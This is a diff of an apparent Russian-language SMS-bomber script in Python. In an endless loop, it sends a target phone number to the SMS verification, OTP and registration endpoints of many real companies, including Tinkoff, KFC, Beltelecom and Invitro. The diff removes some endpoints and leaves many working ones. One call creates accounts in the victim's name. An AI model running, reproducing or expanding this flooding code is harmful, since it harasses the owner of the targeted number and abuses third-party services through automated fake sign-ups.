@@ -65,12 +65,6 @@ while True:
 		print('[-] Не отправлено!')
 
 	try:
-		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-		print('[+] Karusel отправлено!')
-	except:
-		print('[-] Не отправлено!')
-
-	try:
 		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
 		print('[+] Tinkoff отправлено!')
 	except:
@@ -97,13 +91,6 @@ while True:
 		print('[-] Не отправлено!')
 
 
-	try:
-		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
-		print('[+] oyorooms отправлено!')
-	except:
-		print('[-] Не отправлено!')
-
-
 
 	try:
 		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
@@ -124,22 +111,11 @@ while True:
 		print('[-] Не отправлено!')
 
 	try:
-		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-		print('[+] Invitro отправлено!')
-	except:
-		print('[-] Не отправлено!')
-
-	try:
 		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
 		print('[+] Beltelcom отправлено!')
 	except:
 		print('[-] Не отправлено!')
 
-	try:
-		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
-		print('[+] Karusel отправлено!')
-	except:
-		print('[-] Не отправлено!')
 
 	try:
 		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -172,11 +148,6 @@ while True:
 	except:
 		print('[-] Не отправлено!')
 
-	try:
-		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
-		print('[+] Invitro отправлено!')
-	except:
-		print('[-] Не отправлено!')
 
 	try:
 		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
